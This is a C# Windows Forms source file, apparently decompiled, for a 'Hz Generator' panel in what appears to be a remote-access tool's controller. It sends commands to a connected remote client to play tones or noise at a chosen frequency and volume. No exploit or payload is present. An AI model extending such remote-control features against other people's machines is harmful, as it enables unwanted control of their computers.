using System;
using System.ComponentModel;
using System.Drawing;
using System.Reflection;
using System.Windows.Forms;
using CustomControls.RJControls;
using Leb128;
using MaterialSkin;
using MaterialSkin.Controls;
using Server.Connectings;
using Server.Helper;

namespace Server.Forms;

public class FormHzGenerator : FormMaterial
{
	public Clients parrent;

	public Clients client;

	private IContainer components;

	private Timer timer1;

	private RJComboBox rjComboBoxType;

	private MaterialSwitch materialSwitchStart;

	private MaterialLabel materialLabelType;

	private Panel panel1;

	public MaterialSlider materialSlider1;

	public MaterialSlider materialSlider2;

	public FormHzGenerator()
	{
		InitializeComponent();
		base.FormClosing += Closing1;
	}

	private void FormHzGenerator_Load(object sender, EventArgs e)
	{
		MaterialSkinManager.Instance.ThemeChanged += ChangeTheme;
		MaterialSkinManager.Instance.ColorSchemeChanged += ChangeScheme;
		ChangeTheme(this);
		ChangeScheme(this);
		try
		{
			MaterialSlider slider1 = materialSlider1;
			PropertyInfo valueProperty = slider1.GetType().GetProperty("Value");
			PropertyInfo minProperty = slider1.GetType().GetProperty("RangeMin");
			PropertyInfo maxProperty = slider1.GetType().GetProperty("RangeMax");
			if (minProperty != null)
			{
				minProperty.SetValue(slider1, 20);
			}
			if (maxProperty != null)
			{
				maxProperty.SetValue(slider1, 20000);
			}
			if (valueProperty != null)
			{
				valueProperty.SetValue(slider1, 1000);
			}
		}
		catch
		{
		}
		try
		{
			MaterialSlider slider2 = materialSlider2;
			PropertyInfo valueProperty2 = slider2.GetType().GetProperty("Value");
			PropertyInfo minProperty2 = slider2.GetType().GetProperty("RangeMin");
			PropertyInfo maxProperty2 = slider2.GetType().GetProperty("RangeMax");
			if (minProperty2 != null)
			{
				minProperty2.SetValue(slider2, 0);
			}
			if (maxProperty2 != null)
			{
				maxProperty2.SetValue(slider2, 100);
			}
			if (valueProperty2 != null)
			{
				valueProperty2.SetValue(slider2, 50);
			}
		}
		catch
		{
		}
		rjComboBoxType.Items.Clear();
		rjComboBoxType.Items.Add("Sin");
		rjComboBoxType.Items.Add("White");
		rjComboBoxType.Items.Add("Square");
		rjComboBoxType.Items.Add("Pink");
		rjComboBoxType.SelectedIndex = 0;
		timer1.Start();
	}

	private void ChangeTheme(object sender)
	{
		bool num = MaterialSkinManager.Instance.Theme == MaterialSkinManager.Themes.DARK;
		Color backColor = (num ? Color.FromArgb(40, 40, 40) : Color.White);
		if (!num)
		{
			_ = Color.Black;
		}
		else
		{
			_ = Color.White;
		}
		Color comboBackColor = (num ? Color.FromArgb(32, 32, 32) : Color.White);
		Color comboForeColor = (num ? Color.White : Color.Black);
		Color comboListBackColor = (num ? Color.FromArgb(32, 32, 32) : Color.White);
		Color comboListTextColor = (num ? Color.White : Color.Black);
		BackColor = backColor;
		panel1.BackColor = backColor;
		rjComboBoxType.BackColor = comboBackColor;
		rjComboBoxType.ForeColor = comboForeColor;
		rjComboBoxType.ListBackColor = comboListBackColor;
		rjComboBoxType.ListTextColor = comboListTextColor;
		if (materialSlider1 != null)
		{
			materialSlider1.BackColor = backColor;
			materialSlider1.Invalidate();
		}
		if (materialSlider2 != null)
		{
			materialSlider2.BackColor = backColor;
			materialSlider2.Invalidate();
		}
	}

	private void ChangeScheme(object sender)
	{
		rjComboBoxType.BorderColor = FormMaterial.PrimaryColor;
		rjComboBoxType.IconColor = FormMaterial.PrimaryColor;
	}

	private void Closing1(object sender, FormClosingEventArgs e)
	{
		if (client != null)
		{
			try
			{
				client.Send(LEB128.Write(new object[1] { "Stop" }));
			}
			catch
			{
			}
			client.Disconnect();
		}
	}

	private void timer1_Tick(object sender, EventArgs e)
	{
		if (parrent != null && !parrent.itsConnect)
		{
			Close();
		}
		else if (client != null && !client.itsConnect)
		{
			Close();
		}
	}

	private void materialSwitchStart_CheckedChanged(object sender, EventArgs e)
	{
		if (client == null || !client.itsConnect)
		{
			materialSwitchStart.CheckedChanged -= materialSwitchStart_CheckedChanged;
			materialSwitchStart.Checked = false;
			materialSwitchStart.CheckedChanged += materialSwitchStart_CheckedChanged;
		}
		else if (materialSwitchStart.Checked)
		{
			int hz = GetSlider1Value();
			double gain = (double)GetSlider2Value() / 100.0;
			int signal = rjComboBoxType.SelectedIndex;
			client.Send(LEB128.Write(new object[4] { "Start", hz, gain, signal }));
		}
		else
		{
			client.Send(LEB128.Write(new object[1] { "Stop" }));
		}
	}

	private void trackBarHz_Scroll(object sender, EventArgs e)
	{
		if (materialSwitchStart.Checked && client != null && client.itsConnect)
		{
			int hz = GetSlider1Value();
			client.Send(LEB128.Write(new object[2] { "Hz", hz }));
		}
	}

	private void trackBarVolume_Scroll(object sender, EventArgs e)
	{
		if (materialSwitchStart.Checked && client != null && client.itsConnect)
		{
			double gain = (double)GetSlider2Value() / 100.0;
			client.Send(LEB128.Write(new object[2] { "Gain", gain }));
		}
	}

	private void rjComboBoxType_OnSelectedIndexChanged(object sender, EventArgs e)
	{
		if (materialSwitchStart.Checked && client != null && client.itsConnect && rjComboBoxType.SelectedIndex >= 0)
		{
			int signal = rjComboBoxType.SelectedIndex;
			client.Send(LEB128.Write(new object[2] { "Signal", signal }));
		}
	}

	private void materialSlider1_MouseUp(object sender, MouseEventArgs e)
	{
		UpdateHzFromSlider1();
	}

	private void materialSlider1_MouseMove(object sender, MouseEventArgs e)
	{
		if (e.Button == MouseButtons.Left)
		{
			UpdateHzFromSlider1();
		}
	}

	private void materialSlider1_Click(object sender, EventArgs e)
	{
		UpdateHzFromSlider1();
	}

	private void materialSlider2_MouseUp(object sender, MouseEventArgs e)
	{
		UpdateVolumeFromSlider2();
	}

	private void materialSlider2_MouseMove(object sender, MouseEventArgs e)
	{
		if (e.Button == MouseButtons.Left)
		{
			UpdateVolumeFromSlider2();
		}
	}

	private void materialSlider2_Click(object sender, EventArgs e)
	{
		UpdateVolumeFromSlider2();
	}

	private void UpdateHzFromSlider1()
	{
		if (materialSwitchStart.Checked && client != null && client.itsConnect)
		{
			int hz = GetSlider1Value();
			client.Send(LEB128.Write(new object[2] { "Hz", hz }));
		}
	}

	private void UpdateVolumeFromSlider2()
	{
		if (materialSwitchStart.Checked && client != null && client.itsConnect)
		{
			double gain = (double)GetSlider2Value() / 100.0;
			client.Send(LEB128.Write(new object[2] { "Gain", gain }));
		}
	}

	private int GetSlider1Value()
	{
		if (materialSlider1 == null)
		{
			return 1000;
		}
		try
		{
			return materialSlider1.Value;
		}
		catch
		{
			try
			{
				PropertyInfo valueProperty = materialSlider1.GetType().GetProperty("Value");
				if (valueProperty != null)
				{
					return (int)valueProperty.GetValue(materialSlider1);
				}
			}
			catch
			{
			}
			return 1000;
		}
	}

	private int GetSlider2Value()
	{
		if (materialSlider2 == null)
		{
			return 50;
		}
		try
		{
			return materialSlider2.Value;
		}
		catch
		{
			try
			{
				PropertyInfo valueProperty = materialSlider2.GetType().GetProperty("Value");
				if (valueProperty != null)
				{
					return (int)valueProperty.GetValue(materialSlider2);
				}
			}
			catch
			{
			}
			return 50;
		}
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		base.Dispose(disposing);
	}

	private void InitializeComponent()
	{
		this.components = new System.ComponentModel.Container();
		this.timer1 = new System.Windows.Forms.Timer(this.components);
		this.panel1 = new System.Windows.Forms.Panel();
		this.materialLabelType = new MaterialSkin.Controls.MaterialLabel();
		this.rjComboBoxType = new CustomControls.RJControls.RJComboBox();
		this.materialSwitchStart = new MaterialSkin.Controls.MaterialSwitch();
		this.materialSlider1 = new MaterialSkin.Controls.MaterialSlider();
		this.materialSlider2 = new MaterialSkin.Controls.MaterialSlider();
		this.panel1.SuspendLayout();
		base.SuspendLayout();
		this.timer1.Enabled = true;
		this.timer1.Interval = 1000;
		this.timer1.Tick += new System.EventHandler(timer1_Tick);
		this.panel1.Controls.Add(this.materialLabelType);
		this.panel1.Controls.Add(this.rjComboBoxType);
		this.panel1.Controls.Add(this.materialSwitchStart);
		this.panel1.Controls.Add(this.materialSlider1);
		this.panel1.Controls.Add(this.materialSlider2);
		this.panel1.Dock = System.Windows.Forms.DockStyle.Fill;
		this.panel1.Location = new System.Drawing.Point(3, 64);
		this.panel1.Name = "panel1";
		this.panel1.Size = new System.Drawing.Size(297, 181);
		this.panel1.TabIndex = 0;
		this.materialLabelType.AutoSize = true;
		this.materialLabelType.Depth = 0;
		this.materialLabelType.Font = new System.Drawing.Font("Roboto", 14f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Pixel);
		this.materialLabelType.Location = new System.Drawing.Point(12, 97);
		this.materialLabelType.MouseState = MaterialSkin.MouseState.HOVER;
		this.materialLabelType.Name = "materialLabelType";
		this.materialLabelType.Size = new System.Drawing.Size(36, 19);
		this.materialLabelType.TabIndex = 5;
		this.materialLabelType.Text = "Type";
		this.rjComboBoxType.BackColor = System.Drawing.Color.White;
		this.rjComboBoxType.BorderColor = System.Drawing.Color.FromArgb(192, 0, 192);
		this.rjComboBoxType.BorderSize = 1;
		this.rjComboBoxType.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDown;
		this.rjComboBoxType.Font = new System.Drawing.Font("Microsoft Sans Serif", 10f);
		this.rjComboBoxType.ForeColor = System.Drawing.Color.Black;
		this.rjComboBoxType.IconColor = System.Drawing.Color.FromArgb(192, 0, 192);
		this.rjComboBoxType.ListBackColor = System.Drawing.Color.White;
		this.rjComboBoxType.ListTextColor = System.Drawing.Color.Black;
		this.rjComboBoxType.Location = new System.Drawing.Point(67, 97);
		this.rjComboBoxType.MinimumSize = new System.Drawing.Size(150, 30);
		this.rjComboBoxType.Name = "rjComboBoxType";
		this.rjComboBoxType.Padding = new System.Windows.Forms.Padding(1);
		this.rjComboBoxType.Size = new System.Drawing.Size(150, 30);
		this.rjComboBoxType.TabIndex = 6;
		this.rjComboBoxType.Texts = "";
		this.rjComboBoxType.OnSelectedIndexChanged += new System.EventHandler(rjComboBoxType_OnSelectedIndexChanged);
		this.materialSwitchStart.AutoSize = true;
		this.materialSwitchStart.Depth = 0;
		this.materialSwitchStart.Location = new System.Drawing.Point(12, 137);
		this.materialSwitchStart.Margin = new System.Windows.Forms.Padding(0);
		this.materialSwitchStart.MouseLocation = new System.Drawing.Point(-1, -1);
		this.materialSwitchStart.MouseState = MaterialSkin.MouseState.HOVER;
		this.materialSwitchStart.Name = "materialSwitchStart";
		this.materialSwitchStart.Ripple = true;
		this.materialSwitchStart.Size = new System.Drawing.Size(92, 37);
		this.materialSwitchStart.TabIndex = 7;
		this.materialSwitchStart.Text = "Start";
		this.materialSwitchStart.UseVisualStyleBackColor = true;
		this.materialSwitchStart.CheckedChanged += new System.EventHandler(materialSwitchStart_CheckedChanged);
		this.materialSlider1.Depth = 0;
		this.materialSlider1.ForeColor = System.Drawing.Color.FromArgb(222, 0, 0, 0);
		this.materialSlider1.Location = new System.Drawing.Point(15, 5);
		this.materialSlider1.MouseState = MaterialSkin.MouseState.HOVER;
		this.materialSlider1.Name = "materialSlider1";
		this.materialSlider1.Size = new System.Drawing.Size(250, 40);
		this.materialSlider1.TabIndex = 8;
		this.materialSlider1.Text = "Hz";
		this.materialSlider1.Click += new System.EventHandler(materialSlider1_Click);
		this.materialSlider1.MouseMove += new System.Windows.Forms.MouseEventHandler(materialSlider1_MouseMove);
		this.materialSlider1.MouseUp += new System.Windows.Forms.MouseEventHandler(materialSlider1_MouseUp);
		this.materialSlider2.Depth = 0;
		this.materialSlider2.ForeColor = System.Drawing.Color.FromArgb(222, 0, 0, 0);
		this.materialSlider2.Location = new System.Drawing.Point(12, 51);
		this.materialSlider2.MouseState = MaterialSkin.MouseState.HOVER;
		this.materialSlider2.Name = "materialSlider2";
		this.materialSlider2.Size = new System.Drawing.Size(250, 40);
		this.materialSlider2.TabIndex = 9;
		this.materialSlider2.Text = "Volume";
		this.materialSlider2.Click += new System.EventHandler(materialSlider2_Click);
		this.materialSlider2.MouseMove += new System.Windows.Forms.MouseEventHandler(materialSlider2_MouseMove);
		this.materialSlider2.MouseUp += new System.Windows.Forms.MouseEventHandler(materialSlider2_MouseUp);
		base.AutoScaleDimensions = new System.Drawing.SizeF(6f, 13f);
		this.BackColor = System.Drawing.Color.White;
		base.ClientSize = new System.Drawing.Size(303, 248);
		base.Controls.Add(this.panel1);
		base.Enabled = false;
		base.Name = "FormHzGenerator";
		this.Text = "Hz Generator";
		base.Load += new System.EventHandler(FormHzGenerator_Load);
		this.panel1.ResumeLayout(false);
		this.panel1.PerformLayout();
		base.ResumeLayout(false);
	}
}
